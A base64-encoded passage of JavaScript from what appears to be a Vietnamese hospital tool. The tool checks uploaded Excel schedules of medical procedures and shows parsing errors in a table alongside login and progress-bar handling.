udEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uICYmIHJlc3VsdFNlY3Rpb24uc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyB04burbmcgbOG7l2kNCiAgICBlcnJvckxvZy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaWYgKGVycm9yLmRldGFpbHMpIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0ICAgKFF1eSDEkeG7i25oOiAke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWR9IHBow7p0KWAgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjYiIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9ICR7ZXJyb3Iucm93ID8gJyhEw7JuZyAnICsgZXJyb3Iucm93ICsgJyknIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ3Xhu5luIHh14buRbmcgcGjhuqduIGzhu5dpIG7hur91IGPDsw0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBjb25zdCBlcnJvclNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJyk7DQogICAgICAgIGlmIChlcnJvclNlY3Rpb24pIHsNCiAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKGVycm9yU2VjdGlvbiwgLTEzMCk7DQogICAgICAgIH0NCiAgICB9LCAzMDApOw0KfQ0KDQovLyBIw6BtIGN14buZbiBtxrDhu6N0IHThu5VuZyBxdcOhdA0KZnVuY3Rpb24gc21vb3RoU2Nyb2xsVG8oZWxlbWVudCwgb2Zmc2V0ID0gMCkgew0KICAgIGVsZW1lbnQuY2xhc3NMaXN0LmFkZCgnaGlnaGxpZ2h0LWVycm9yLXNlY3Rpb24nKTsNCiAgICANCiAgICBjb25zdCBlbGVtZW50UG9zaXRpb24gPSBlbGVtZW50LmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpLnRvcDsNCiAgICBjb25zdCBvZmZzZXRQb3NpdGlvbiA9IGVsZW1lbnRQb3NpdGlvbiArIHdpbmRvdy5wYWdlWU9mZnNldCAtIG9mZnNldDsNCiAgICANCiAgICBjb25zdCBkdXJhdGlvbiA9IDE1MDA7DQogICAgY29uc3Qgc3RhcnQgPSB3aW5kb3cucGFnZVlPZmZzZXQ7DQogICAgY29uc3Qgc3RhcnRUaW1lID0gcGVyZm9ybWFuY2Uubm93KCk7DQogICAgDQogICAgZnVuY3Rpb24gc2Nyb2xsU3RlcCh0aW1lc3RhbXApIHsNCiAgICAgICAgY29uc3QgZWxhcHNlZCA9IHRpbWVzdGFtcCAtIHN0YXJ0VGltZTsNCiAgICAgICAgY29uc3QgcHJvZ3Jlc3MgPSBNYXRoLm1pbihlbGFwc2VkIC8gZHVyYXRpb24sIDEpOw0KICAgICAgICBjb25zdCBlYXNpbmcgPSBlYXNlSW5PdXRDdWJpYyhwcm9ncmVzcyk7DQogICAgICAgIHdpbmRvdy5zY3JvbGxUbygwLCBzdGFydCArIChvZmZzZXRQb3NpdGlvbiAtIHN0YXJ0KSAqIGVhc2luZyk7DQogICAgICAgIA0KICAgICAgICBpZiAocHJvZ3Jlc3MgPCAxKSB7DQogICAgICAgICAgICB3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHNjcm9sbFN0ZXApOw0KICAgICAgICB9DQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIGVhc2VJbk91dEN1YmljKHQpIHsNCiAgICAgICAgcmV0dXJuIHQgPCAwLjUgPyA0ICogdCAqIHQgKiB0IDogMSAtIE1hdGgucG93KC0yICogdCArIDIsIDMpIC8gMjsNCiAgICB9DQogICAgDQogICAgd2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZShzY3JvbGxTdGVwKTsNCiAgICANCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgZWxlbWVudC5jbGFzc0xpc3QucmVtb3ZlKCdoaWdobGlnaHQtZXJyb3Itc2VjdGlvbicpOw0KICAgIH0sIDIwMDApOw0KfQ0KDQoNCiANCg0KICAgICAgICBmdW5jdGlvbiBwYXJzZURhdGVUaW1lKGRhdGV0aW1lU3RyLCByb3dJbmRleCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBpZiAoIWRhdGV0aW1lU3RyKSB7DQogICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0ZXRpbWVTdHIgPT09ICdudW1iZXInKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGV4Y2VsRGF0ZSA9IG5ldyBEYXRlKE1hdGgucm91bmQoKGRhdGV0aW1lU3RyIC0gMjU1NjkpICogODY0MDAgKiAxMDAwKSk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGRheSA9IGV4Y2VsRGF0ZS5nZXREYXRlKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IG1vbnRoID0gZXhjZWxEYXRlLmdldE1vbnRoKCkgKyAxOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCB5ZWFyID0gZXhjZWxEYXRlLmdldEZ1bGxZZWFyKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGhvdXJzID0gZXhjZWxEYXRlLmdldEhvdXJzKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IG1pbnV0ZXMgPSBleGNlbERhdGUuZ2V0TWludXRlcygpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBzZWNvbmRzID0gZXhjZWxEYXRlLmdldFNlY29uZHMoKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiB7DQogICAgICAgICAgICAgICAgICAgICAgICBkYXRlT2JqOiBleGNlbERhdGUsDQogICAgICAgICAgICAgICAgICAgICAgICBkYXRlS2V5OiBgJHtkYXl9LyR7bW9udGh9LyR7eWVhcn1gLA0KICAgICAgICAgICAgICAgICAgICAgICAgbWludXRlczogaG91cnMgKiA2MCArIG1pbnV0ZXMsDQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzOiBob3VycyAqIDM2MDAgKyBtaW51dGVzICogNjAgKyBzZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVRpbWU6IGAke2hvdXJzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHttaW51dGVzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHtzZWNvbmRzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX1gDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIGRhdGV0aW1lU3RyID09PSAnc3RyaW5nJykgew0KICAgICAgICAgICAgICAgICAgICBsZXQgZGF0ZVBhcnQsIHRpbWVQYXJ0ID0gJzAwOjAwOjAwJzsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGV0aW1lU3RyLmluY2x1ZGVzKCcgJykpIFtkYXRlUGFydCwgdGltZVBhcnRdID0gZGF0ZXRpbWVTdHIuc3BsaXQoJyAnKTsNCiAgICAgICAgICAgICAgICAgICAgZWxzZSBkYXRlUGFydCA9IGRhdGV0aW1lU3RyOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbGV0IGRheSwgbW9udGgsIHllYXI7DQogICAgICAgICAgICAgICAgICAgIGlmIChkYXRlUGFydC5pbmNsdWRlcygnLycpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IGRhdGVQYXJ0LnNwbGl0KCcvJyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSBbZGF5LCBtb250aCwgeWVhcl0gPSBwYXJ0cy5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMikgW2RheSwgbW9udGhdID0gcGFydHMubWFwKE51bWJlciksIHllYXIgPSBuZXcgRGF0ZSgpLmdldEZ1bGxZZWFyKCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZGF0ZVBhcnQuaW5jbHVkZXMoJy0nKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGFydHMgPSBkYXRlUGFydC5zcGxpdCgnLScpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMykgW3llYXIsIG1vbnRoLCBkYXldID0gcGFydHMubWFwKE51bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChwYXJ0cy5sZW5ndGggPT09IDIpIFttb250aCwgZGF5XSA9IHBhcnRzLm1hcChOdW1iZXIpLCB5ZWFyID0gbmV3IERhdGUoKS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgdGhyb3cgbmV3IEVycm9yKCfEkOG7i25oIGThuqFuZyBuZ8OgeSBraMO0bmcgxJHGsOG7o2MgaOG7lyB0cuG7oycpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzTmFOKGRheSkgfHwgaXNOYU4obW9udGgpIHx8IGlzTmFOKHllYXIpIHx8IGRheSA8IDEgfHwgZGF5ID4gMzEgfHwgbW9udGggPCAxIHx8IG1vbnRoID4gMTIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignR2nDoSB0cuG7iyBuZ8OgeSBraMO0bmcgaOG7o3AgbOG7hycpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBsZXQgaG91cnMgPSAwLCBtaW51dGVzID0gMCwgc2Vjb25kcyA9IDA7DQogICAgICAgICAgICAgICAgICAgIGlmICh0aW1lUGFydC5pbmNsdWRlcygnOicpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCB0aW1lUGFydHMgPSB0aW1lUGFydC5zcGxpdCgnOicpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPSBwYXJzZUludCh0aW1lUGFydHNbMF0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzID0gcGFyc2VJbnQodGltZVBhcnRzWzFdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kcyA9IHBhcnNlSW50KHRpbWVQYXJ0c1syXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzTmFOKGhvdXJzKSB8fCBpc05hTihtaW51dGVzKSB8fCBpc05hTihzZWNvbmRzKSB8fCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBob3VycyA8IDAgfHwgaG91cnMgPiAyMyB8fCBtaW51dGVzIDwgMCB8fCBtaW51dGVzID4gNTkgfHwgc2Vjb25kcyA8IDAgfHwgc2Vjb25kcyA+IDU5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ0dpw6EgdHLhu4sgdGjhu51pIGdpYW4ga2jDtG5nIGjhu6NwIGzhu4cnLCByb3dJbmRleCwgeyB0aW1lOiB0aW1lUGFydCB9KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBob3VycyA9IDA7IG1pbnV0ZXMgPSAwOyBzZWNvbmRzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF0ZU9iaiA9IG5ldyBEYXRlKHllYXIsIG1vbnRoIC0gMSwgZGF5LCBob3VycywgbWludXRlcywgc2Vjb25kcyk7DQogICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihkYXRlT2JqLmdldFRpbWUoKSkpIHRocm93IG5ldyBFcnJvcignTmfDoHkga2jDtG5nIGjhu6NwIGzhu4cnKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNlY29uZHNJbkRheSA9IGhvdXJzICogMzYwMCArIG1pbnV0ZXMgKiA2MCArIHNlY29uZHM7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IG1pbnV0ZXNJbkRheSA9IGhvdXJzICogNjAgKyBtaW51dGVzOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVPYmosDQogICAgICAgICAgICAgICAgICAgICAgICBkYXRlS2V5OiBgJHtkYXl9LyR7bW9udGh9LyR7eWVhcn1gLA0KICAgICAgICAgICAgICAgICAgICAgICAgbWludXRlczogbWludXRlc0luRGF5LA0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kczogc2Vjb25kc0luRGF5LA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVRpbWU6IGAke2hvdXJzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHttaW51dGVzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHtzZWNvbmRzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX1gDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignxJDhu4tuaCBk4bqhbmcgdGjhu51pIGdpYW4ga2jDtG5nIMSRxrDhu6NjIGjhu5cgdHLhu6MnKTsNCiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgbG9nRXJyb3IoYEzhu5dpIHBow6JuIHTDrWNoIHRo4budaSBnaWFuOiAke2Vycm9yLm1lc3NhZ2V9YCwgcm93SW5kZXgsIHsgDQogICAgICAgICAgICAgICAgICAgIHZhbHVlOiBkYXRldGltZVN0ciwNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JEZXRhaWxzOiBlcnJvci5zdGFjayANCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIC8vID09PT09PT09PT0gS0jhu55JIFThuqBPIFPhu7AgS0nhu4ZOID09PT09PT09PT0gLy8NCiAgICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLmZvY3VzKCk7DQogICAgICAgICAgICAvLyBLaGkgdHJhbmcgbG9hZA0KICAgICAgICAgICAgaWYgKCFzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykpIHsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5hZGQoJ2xvZ2luLXBhZ2UnKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSDEkcSDbmcgbmjhuq1wIGtoaSB0cmFuZyB04bqjaQ0KCQkNCgkJCQ0KICAgICAgICAgICAgY2hlY2tTYXZlZExvZ2luKCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgxJHEg25nIG5o4bqtcA0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgaXNMb2dpbkFjdGlvbiA9IHRydWU7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQogICAgY2hlY2tMb2dpbigpOw0KfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgxJHEg25nIHh14bqldA0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ291dEJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGlzTG9naW5BY3Rpb24gPSBmYWxzZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBsb2dvdXQoKTsNCn0pOw0KDQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIMSQxINuZyBuaOG6rXAgYuG6sW5nIHBow61tIEVudGVyDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICAgICAgICAgICAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICAgICAgICAgICAgICAgIGNoZWNrTG9naW4oKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCBwaMOibiB0w61jaCBmaWxlDQogICAgICAgICAgICANCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBhc3luYyAoKSA9PiB7DQogIGF3YWl0IGVuc3VyZVhMU1goKTsgLy8gbuG6oXAgWExTWCDEkcO6bmcgbMO6YyBkw7luZw0KICAgIGNvbnN0IGZpbGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0JykuZmlsZXNbMF07DQppZiAoIWZpbGUpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+VnVpIGzDsm5nIGNo4buNbiBmaWxlIHRyxrDhu5tjIGtoaSBraeG7g20gdHJhPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5PSdub25lJyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcmV0dXJuOw0KfQ0KDQoNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93JykpOw0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtcGFwZXItcGxhbmUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMzQ5OGRiO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQYW5nIGfhu61pIGThu68gbGnhu4d1IHbhu4EgbcOheSBjaOG7py4uLic7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMzMlJzsNCgkNCgkNCgkNCgljb25zdCBwcm9ncmVzc0JhckNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhckNvbnRhaW5lcicpOw0KDQovLyBDaOG7iSB04bqhbyAxIGzhuqduDQppZiAoIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjcmVkaXRMaW5lQmVsb3cnKSkgew0KICBjb25zdCBjcmVkaXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgY3JlZGl0LmlkID0gJ2NyZWRpdExpbmVCZWxvdyc7DQogIGNyZWRpdC5pbm5lclRleHQgPSAnwqkgVGhp4bq/dCBr4bq/ICYgcGjDoXQgdHJp4buDbiBi4bufaSBDaMOidSBIdeG7s25oJzsNCiAgY3JlZGl0LnN0eWxlLm1hcmdpblRvcCA9ICcxMHB4JzsNCiAgY3JlZGl0LnN0eWxlLmZvbnRTaXplID0gJzE2cHgnOw0KICBjcmVkaXQuc3R5bGUuY29sb3IgPSAnI0ZGMDAwMCc7DQogIGNyZWRpdC5zdHlsZS50ZXh0QWxpZ24gPSAnY2VudGVyJzsNCg0KICBwcm9ncmVzc0JhckNvbnRhaW5lci5wYXJlbnROb2RlLmluc2VydEJlZm9yZShjcmVkaXQsIHByb2dyZXNzQmFyQ29udGFpbmVyLm5leHRTaWJsaW5nKTsNCn0NCgkNCgkNCgkNCgkNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDUwKSkpOw0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCA3MDApKTsNCg0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzY2JSc7DQoNCiAgICBsZXQgdG90YWwgPSAwOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IGZpbGVSZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOw0KICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gew0KICAgICAgICAgICAgZmlsZVJlYWRlci5vbmxvYWQgPSBlID0+IHJlc29sdmUobmV3IFVpbnQ4QXJyYXkoZS50YXJnZXQucmVzdWx0KSk7DQogICAgICAgICAgICBmaWxlUmVhZGVyLm9uZXJyb3IgPSAoKSA9PiByZWplY3QobmV3IEVycm9yKCJM4buXaSDEkeG7jWMgZmlsZSIpKTsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoZmlsZSk7DQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCiAgICAgICAgY29uc3QgZmlyc3RTaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oZmlyc3RTaGVldCwgew0KICAgICAgICAgICAgaGVhZGVyOiAxLA0KICAgICAgICAgICAgZGVmdmFsOiAiIiwNCiAgICAgICAgICAgIGJsYW5rcm93czogdHJ1ZQ0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCByb3dzID0ganNvbkRhdGEuc2xpY2UoOSk7DQogICAgICAgIHRvdGFsID0gcm93cy5sZW5ndGg7DQogICAgfSBjYXRjaCB7DQogICAgICAgIHRvd